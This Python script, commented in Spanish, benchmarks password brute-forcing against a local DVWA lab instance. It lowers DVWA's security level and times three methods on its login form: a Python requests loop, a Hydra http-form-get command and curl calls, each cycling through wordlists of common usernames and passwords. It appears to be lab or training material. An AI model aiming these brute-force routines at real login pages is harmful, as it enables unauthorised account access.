#!/usr/bin/env python3
"""
Script de benchmark para comparar herramientas de fuerza bruta
contra DVWA (Damn Vulnerable Web Application)
"""

import requests
import time
import subprocess
import os
from datetime import datetime
import json

# Configuración
DVWA_URL = "http://127.0.0.1:8081"
LOGIN_URL = f"{DVWA_URL}/login.php"
BRUTE_URL = f"{DVWA_URL}/vulnerabilities/brute/"

# Archivos de diccionarios
USERS_FILE = "usernames.txt"
PASS_FILE = "passwords.txt"

# Credenciales válidas para login inicial
VALID_USER = "admin"
VALID_PASS = "password"

class BenchmarkResults:
    def _init_(self):
        self.results = {}
    
    def add_result(self, tool, time_taken, requests_made, success_count):
        if not hasattr(self, 'results'):
            self.results = {}
        self.results[tool] = {
            'time': round(time_taken, 2),
            'requests': requests_made,
            'req_per_sec': round(requests_made / time_taken, 2) if time_taken > 0 else 0,
            'success': success_count
        }
    
    def print_results(self):
        print("\n" + "="*70)
        print("RESULTADOS DEL BENCHMARK")
        print("="*70)
        if not hasattr(self, 'results') or not self.results:
            print("No hay resultados disponibles")
            return
        for tool, data in self.results.items():
            print(f"\n{tool}:")
            print(f"  Tiempo total: {data['time']} segundos")
            print(f"  Requests: {data['requests']}")
            print(f"  Velocidad: {data['req_per_sec']} req/s")
            print(f"  Credenciales encontradas: {data['success']}")
        print("="*70 + "\n")
     
        

def get_dvwa_session():
    """Obtiene una sesión válida de DVWA"""
    session = requests.Session()
    
    # Obtener token CSRF
    response = session.get(LOGIN_URL)
    if 'user_token' in response.text:
        import re
        token_match = re.search(r'user_token\'\s+value=\'([^\']+)', response.text)
        if token_match:
            token = token_match.group(1)
        else:
            token = ""
    else:
        token = ""
    
    # Login
    login_data = {
        'username': VALID_USER,
        'password': VALID_PASS,
        'Login': 'Login',
        'user_token': token
    }
    
    session.post(LOGIN_URL, data=login_data)
    
    # Configurar security level a low
    session.get(f"{DVWA_URL}/security.php?security=low")
    
    return session

def load_credentials():
    """Carga los archivos de usuarios y contraseñas"""
    if not os.path.exists(USERS_FILE) or not os.path.exists(PASS_FILE):
        print("Creando archivos de diccionarios...")
        
        users = ['admin', 'user', 'root', 'test', 'guest', 
                'demo', 'administrator', 'admin123', 'user123', 'test123']
        passwords = ['password', 'admin', '123456', 'root', '12345',
                    '1234', 'qwerty', 'abc123', 'password123', 'admin123']
        
        with open(USERS_FILE, 'w') as f:
            f.write('\n'.join(users))
        
        with open(PASS_FILE, 'w') as f:
            f.write('\n'.join(passwords))
    
    with open(USERS_FILE, 'r') as f:
        users = [line.strip() for line in f if line.strip()]
    
    with open(PASS_FILE, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    return users, passwords

def benchmark_python(users, passwords):
    """Benchmark usando Python requests"""
    print("\n[1/3] Ejecutando benchmark con Python requests...")
    
    session = get_dvwa_session()
    
    start_time = time.time()
    requests_made = 0
    success_count = 0
    
    for username in users:
        for password in passwords:
            try:
                url = f"{BRUTE_URL}?username={username}&password={password}&Login=Login"
                response = session.get(url, timeout=5)
                requests_made += 1
                
                if "Welcome to the password protected area" in response.text:
                    success_count += 1
                    print(f"  ✓ Encontrado: {username}:{password}")
            except Exception as e:
                print(f"  Error: {e}")
                continue
    
    end_time = time.time()
    time_taken = end_time - start_time
    
    return time_taken, requests_made, success_count

def benchmark_hydra(users, passwords):
    """Benchmark usando Hydra"""
    print("\n[2/3] Ejecutando benchmark con Hydra...")
    
    # Obtener sesión para cookie
    session = get_dvwa_session()
    cookies = session.cookies.get_dict()
    cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
    
    # Construir comando Hydra
    cmd = [
        'hydra',
        '-L', USERS_FILE,
        '-P', PASS_FILE,
        '127.0.0.1',
        'http-form-get',
        f'/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: {cookie_string}:F=Username and/or password incorrect.',
        '-s', '8081',
        '-t', '4',
        '-w', '5'
    ]
    
    try:
        start_time = time.time()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        end_time = time.time()
        
        time_taken = end_time - start_time
        
        # Contar éxitos
        output = result.stdout
        success_count = output.count("login:") if "login:" in output else 0
        
        # Estimar requests (users * passwords)
        requests_made = len(users) * len(passwords)
        
        print(f"  Hydra completado en {time_taken:.2f}s")
        if success_count > 0:
            print(f"  ✓ {success_count} credenciales encontradas")
        
        return time_taken, requests_made, success_count
    
    except subprocess.TimeoutExpired:
        print("  ⚠ Hydra timeout - tomó demasiado tiempo")
        return 0, 0, 0
    except FileNotFoundError:
        print("  ⚠ Hydra no está instalado")
        return 0, 0, 0
    except Exception as e:
        print(f"  ⚠ Error ejecutando Hydra: {e}")
        return 0, 0, 0

def benchmark_curl(users, passwords):
    """Benchmark usando cURL"""
    print("\n[3/3] Ejecutando benchmark con cURL...")
    
    # Crear archivo de cookies
    session = get_dvwa_session()
    cookies = session.cookies.get_dict()
    
    with open('cookies.txt', 'w') as f:
        for key, value in cookies.items():
            f.write(f"{key}\t{value}\n")
    
    start_time = time.time()
    requests_made = 0
    success_count = 0
    
    for username in users:
        for password in passwords:
            url = f"{BRUTE_URL}?username={username}&password={password}&Login=Login"
            cmd = [
                'curl',
                '-s',
                '-b', 'cookies.txt',
                url
            ]
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                requests_made += 1
                
                if "Welcome to the password protected area" in result.stdout:
                    success_count += 1
                    print(f"  ✓ Encontrado: {username}:{password}")
            
            except Exception as e:
                print(f"  Error: {e}")
                continue
    
    end_time = time.time()
    time_taken = end_time - start_time
    
    # Limpiar
    if os.path.exists('cookies.txt'):
        os.remove('cookies.txt')
    
    return time_taken, requests_made, success_count

def main():
    print("="*70)
    print("BENCHMARK DE HERRAMIENTAS DE FUERZA BRUTA")
    print("="*70)
    print(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {DVWA_URL}")
    print("="*70)
    
    # Cargar credenciales
    users, passwords = load_credentials()
    total_combinations = len(users) * len(passwords)
    print(f"\nCombinaciones a probar: {total_combinations}")
    print(f"Usuarios: {len(users)}, Contraseñas: {len(passwords)}")
    
    results = BenchmarkResults()
    
    # 1. Python
    try:
        time_taken, requests_made, success = benchmark_python(users, passwords)
        results.add_result("Python (requests)", time_taken, requests_made, success)
    except Exception as e:
        print(f"Error en Python benchmark: {e}")
    
    # 2. Hydra
    try:
        time_taken, requests_made, success = benchmark_hydra(users, passwords)
        if time_taken > 0:
            results.add_result("Hydra", time_taken, requests_made, success)
    except Exception as e:
        print(f"Error en Hydra benchmark: {e}")
    
    # 3. cURL
    try:
        time_taken, requests_made, success = benchmark_curl(users, passwords)
        results.add_result("cURL/Bash", time_taken, requests_made, success)
    except Exception as e:
        print(f"Error en cURL benchmark: {e}")
    
    # Mostrar resultados
    results.print_results()
    
    # Guardar resultados en JSON
    with open('benchmark_results.json', 'w') as f:
        json.dump(results.results, f, indent=2)
    print("\n✓ Resultados guardados en benchmark_results.json")

if __name__ == "__main__":
    main()